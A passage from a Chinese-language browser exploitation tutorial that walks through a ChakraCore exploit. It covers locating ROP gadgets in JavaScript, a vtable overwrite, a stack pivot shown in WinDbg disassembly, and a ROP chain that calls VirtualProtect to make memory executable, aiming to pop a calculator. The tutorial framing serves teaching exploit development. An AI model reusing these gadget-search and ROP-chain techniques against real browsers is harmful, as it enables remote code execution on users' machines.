            }
            for (var j = 1; j = 0 && byteArray[idx + j] != bytes[j]) {
                    break;
                }
            }
            if (j == bytes.length) {
                break;
            }
            idx++;
        }
        gadgets[name] = p + codeBase+ idx;
    });
    return gadgets;
###  3\. 修改虚表指针，指向 gadgets
寻找 `int3` 的地址，将 obj 的虚表重定向到该地址，执行 int3 一般厂商即认可代码执行的有效性。
但是我们还是希望通过努力，在 pc 上弹出一个计算器，这样更直观，也更加接近 pwn2own 的赛制要求。
## 弹出计算器
通过 rop 的方式，弹出计算器，首先需要控制 stack 指针(rsp)。rsp 的获得大致有两种途径：（1）修改 rsp
为可控的值（2）通过任意地址读写泄漏 rsp。 这里为了简单，我们采用第一种方式。至于第二种方式，有兴趣的小伙伴可以参考 pwnjs
项目（[https://github.com/theori-io/pwnjs）。后续如果时间允许，我也将第二种方式详细的实现放在博客上。](https://github.com/theori-io/pwnjs%EF%BC%89%E3%80%82%E5%90%8E%E7%BB%AD%E5%A6%82%E6%9E%9C%E6%97%B6%E9%97%B4%E5%85%81%E8%AE%B8%EF%BC%8C%E6%88%91%E4%B9%9F%E5%B0%86%E7%AC%AC%E4%BA%8C%E7%A7%8D%E6%96%B9%E5%BC%8F%E8%AF%A6%E7%BB%86%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%94%BE%E5%9C%A8%E5%8D%9A%E5%AE%A2%E4%B8%8A%E3%80%82)  
通过修改虚表指针的方式，我们可以控制至少一个寄存器，这里的可控寄存器是 rax 。rax 是 fake 的虚表，虚表的第一项为 int3 的地址。
###  stack pivot
理想的 gadget 是一些 rsp，rax 的直接交互， 如： xchg rsp, rax 或者 mov rsp，rax 或者 push rax; pop
rsp 之类，但是这里我们并不能直接获得这类 gadget 。通过编写小工具，很容易定位到一些有用的同等效力的gadget， 如：
    0:003> u 0x294FC6 + chakracore
    chakracore!::operator()+0x8a [e:a_work39slibruntimedebugprobecontainer.cpp @ 375]:
    00007ffc`b1434fc6 50              push    rax
    00007ffc`b1434fc7 08488b          or      byte ptr [rax-75h],cl
    00007ffc`b1434fca 5c              pop     rsp
    00007ffc`b1434fcb 2430            and     al,30h
    00007ffc`b1434fcd 4883c420        add     rsp,20h
    00007ffc`b1434fd1 5f              pop     rdi
    00007ffc`b1434fd2 c3              ret
栈迁移后，我们就可以着手准备 rop 链和 shellcode 了。这部分的整体逻辑示意图如下：
通过调用 VirtualProtect 将地址属性修改为可执行，然后执行 shellcode。
###  补充一些背景知识
x64 calling convention (), 参数依次存放在 rcx, rex, r8, r9
和栈上。  
VirtualProtect 的函数原型如下：
    BOOL VirtualProtect
          LPVOID lpAddress,
          SIZE_T dwSize,
          DWORD  flNewProtect,
          PDWORD lpflOldProtect
        );
该 API 需要4个参数，依次对应 lpAddress  rcx, dwSize  rdx, flNewProtect  r8,
lpflOldProtect  r9。
我们理想的 gadget 当然就是: pop rcx; pop rdx; pop r8; pop r9; ret; 同样的，实际上并没有这类
gadget，我们选择一些同等效力的替代 gadget ：pop rcx; ret 和 pop rdx; ret 和 pop r8x; ret; 由于 r9
没有类似的 gadget，我选择另外一个gadget：
    0:003> u F42DD + chakracore
    chakracore!FlowGraph::FindEdge+0x35 [e:a_work39slibbackendflowgraph.cpp @ 623]:
    00007ffc`b12942dd 4c8bc8          mov     r9,rax
    00007ffc`b12942e0 498bc1          mov     rax,r9
    00007ffc`b12942e3 4883c438        add     rsp,38h
    00007ffc`b12942e7 c3              ret
准备 VirtualProtect 参数的 rop 链，的示例代码如下：
        var gadget_pop_int3 = new Addr(gadgets_addr_list['int3']);
        var gadget_pop_rcx  = new Addr(gadgets_addr_list['pop_rcx']);
        var gadget_pop_rdx  = new Addr(gadgets_addr_list['pop_rdx']);
        var gadget_pop_r8   = new Addr(gadgets_addr_list['pop_r8']);
        var gadget_pop_r9   = new Addr(chakracore_base + 0xF42DD);
    /*    
    0:003> u chakracore + 0xF42DD
    chakracore!FlowGraph::FindEdge+0x35 [e:a_work39slibbackendflowgraph.cpp @ 623]:
    00007ffc`b12942dd 4c8bc8          mov     r9,rax
    00007ffc`b12942e0 498bc1          mov     rax,r9
    00007ffc`b12942e3 4883c438        add     rsp,38h
    00007ffc`b12942e7 c3              ret
    */    
        var rop_chain = [
             gadget_pop_rcx.low,     gadget_pop_rcx.high        // gadget: pop rcx
            ,ret_list[0],             ret_list[1]                  // lpAddress
            ,gadget_pop_rdx.low,     gadget_pop_rdx.high        // gadget: pop rdx
            ,1*0x1000*0x1000,         0x0                         // dwSize
            ,gadget_pop_r8.low,     gadget_pop_r8.high           // gadget: pop r8
            ,0x40,                     0x0                        // flNewProtect
            ,gadget_pop_int3.low,   gadget_pop_int3.high       // int3
        ];
        for(var i=0; i<rop_chain.length ;i++){
            fake_stack[i + 26] = rop_chain[i];
        }
上面的 rop 执行后，寄存器的值如下：
VirtualProtect rop 链调用之前的内存属性为：读写：
VirtualProtect rop 链调用之后的内存属性为：读写+执行：
表明 rop 链调用 VirtualProtect 已经成功，剩下的就只有实现 shellcode部分了。
最终效果如下：
## Last but not least
还记得当初的目标吗？ ”零基础在浏览器中稳定的弹出第一个计算器“。 在 Chakra 的漏洞利用中，我们只需要解决ASLR 和 DEP的问题。在 Edge
中，将面临 CFG、 Sandbox 、CIG 、ACG 等挑战。如何将 exp 稳定的移植到 Edge 中？怎样处理CFG？…
###  Stay tuned !